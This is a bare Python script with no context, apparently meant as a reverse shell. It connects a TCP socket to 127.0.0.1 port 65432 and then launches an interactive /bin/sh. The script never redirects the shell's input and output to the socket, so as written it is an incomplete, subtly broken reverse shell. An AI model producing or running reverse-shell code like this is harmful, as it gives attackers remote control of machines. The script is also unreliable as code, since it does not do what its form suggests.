#!/usr/bin/python3
import socket
import subprocess

HOST = "127.0.0.1"
PORT = 65432

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    subprocess.call(["/bin/sh", "-i"])